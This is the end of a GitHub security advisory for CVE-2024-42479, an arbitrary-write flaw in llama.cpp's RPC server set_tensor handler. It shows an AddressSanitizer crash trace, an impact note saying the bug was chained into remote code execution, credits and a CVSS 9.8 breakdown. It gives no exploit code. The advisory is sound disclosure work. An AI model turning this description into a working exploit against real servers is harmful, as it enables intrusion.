    #1 0x7f320e3464ea in rpc_server::set_tensor(std::vector<unsigned char, std::allocator<unsigned char> > const&) (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x1464ea)
    #2 0x7f320e35765a in start_rpc_server (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x15765a)
    #3 0x573e32234c63 in main (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/bin/rpc-server+0x2c63)
    #4 0x7f320da29d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #5 0x7f320da29e3f in __libc_start_main_impl ../csu/libc-start.c:392
    #6 0x573e32234ff4 in _start (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/bin/rpc-server+0x2ff4)

Address 0x0000deadbeef is located in the shadow gap area.
SUMMARY: AddressSanitizer: unknown-crash ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy
==12636==ABORTING
```
## Impact

This vulnerability can be used as a `primitive` for arbitrary writes in an exploit. I used this vulnerability along with another arbitrary address read vulnerability to achieve RCE(Remote Command Execute), demonstrating the significant impact of the vulnerability. The RCE video is as follows:<https://drive.google.com/file/d/1vuoxQblMJ7KcaH05Z_sk_ruHSN0ftKvz/view?usp=sharing>

## Credit

This vulnerability was discovered by `7resp4ss` and `Guang Gong` from `360 Vulnerability Research Institute`.

### Severity

Critical

9.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2024-42479

### Weaknesses

[CWE-123](/advisories?query=cwe%3A123)

### Credits

* [![@7resp4ss](https://avatars.githubusercontent.com/u/81899344?s=40&v=4)](/7resp4ss)
  [7resp4ss](/7resp4ss)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


